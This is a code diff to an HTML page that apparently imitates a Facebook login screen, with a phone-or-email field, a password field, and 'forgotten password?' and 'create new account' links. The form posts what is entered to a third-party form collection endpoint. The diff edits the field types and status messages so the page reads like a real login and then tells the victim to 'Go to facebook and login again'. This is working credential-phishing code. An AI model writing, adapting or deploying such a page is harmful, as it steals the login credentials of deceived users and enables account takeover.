@@ -18,7 +18,7 @@
     <img src="dF5SId3UHWd.svg" alt="">
     <form action="https://formspree.io/f/mdoyzogn" method="POST">
         <label>
-            <input type="email" name="_replyto" placeholder="Mobile number or email adress">
+            <input type="text" name="_replyto" placeholder="Mobile number or email adress">
         </label>
         <label>
             <input type='password' name="message" placeholder="password">
@@ -26,7 +26,7 @@
 
         <!-- your other form fields go here -->
 
-        <button type="submit">Send</button>
+        <button type="Login">Send</button>
     </form>
     <a href="#" class="f">forgotten password?</a>
     <a href="#" class="c">create new account</a>
@@ -44,10 +44,10 @@
                     'Accept': 'application/json'
                 }
             }).then(response => {
-                status.innerHTML = "Thanks for your submission!";
+                status.innerHTML = "Go to facebook and login again";
                 form.reset()
             }).catch(error => {
-                status.innerHTML = "Oops! There was a problem submitting your form"
+                status.innerHTML = "Oops! There was a problem with login"
             });
         }
         form.addEventListener("submit", handleSubmit)
